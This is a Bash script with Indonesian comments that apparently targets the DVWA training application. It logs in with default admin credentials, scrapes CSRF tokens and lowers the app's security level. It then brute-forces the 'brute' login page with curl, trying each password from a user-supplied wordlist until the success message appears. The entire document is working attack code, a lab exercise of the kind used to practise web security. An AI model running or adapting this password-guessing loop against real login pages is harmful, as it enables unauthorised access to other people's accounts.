#!/bin/bash

# --- BAGIAN YANG DITAMBAHKAN (INPUT INTERAKTIF) ---
read -p "[?] input target URL (default http://127.0.0.1:8000): " TARGET
TARGET="${TARGET:-http://127.0.0.1:8000}" # Kalau dikosongkan/di-enter, otomatis pakai default ini

read -p "[?] input target username: " USER
read -p "[?] input file  name passlist: " PASS_FILE
echo "-----------------------------------------------"
# -------------------------------------------------

COOKIE="./cookie.txt"
rm -f $COOKIE

echo "[*] Login..."
PAGE=$(curl -s -c $COOKIE "$TARGET/login.php")
T1=$(echo "$PAGE" | grep user_token | sed "s/.*value='//" | cut -d"'" -f1)
curl -s -L -b $COOKIE -c $COOKIE --data "username=admin&password=password&Login=Login&user_token=$T1" "$TARGET/login.php" > /dev/null

echo "[*] Ganti ke LOW (ambil token security)..."
SEC_PAGE=$(curl -s -b $COOKIE "$TARGET/security.php")
T2=$(echo "$SEC_PAGE" | grep user_token | sed "s/.*value='//" | cut -d"'" -f1)
curl -s -L -b $COOKIE -c $COOKIE --data "security=low&seclev_submit=Submit&user_token=$T2" "$TARGET/security.php" > /dev/null

# cek beneran ke ganti gak
curl -s -b $COOKIE "$TARGET/security.php" | grep -i "Security Level" | head -1

echo "[+] Target: $TARGET/vulnerabilities/brute/ [low]"
echo "-----------------------------------------------"

while read -r PASS; do
  RESP=$(curl -s -G --data-urlencode "username=$USER" --data-urlencode "password=$PASS" --data-urlencode "Login=Login" -b $COOKIE "$TARGET/vulnerabilities/brute/")
  
  # Warna merah untuk mencoba (failed)
  echo -e "\e[31m[-] Trying: $PASS\e[0m"

  if echo "$RESP" | grep -q "Welcome to the password protected area"; then
    echo ""
    # Warna hijau ketika password ditemukan
    echo -e "\e[32m[+] FOUND! -> $PASS\e[0m"
    break
  fi
done < "$PASS_FILE"

rm -f $COOKIE

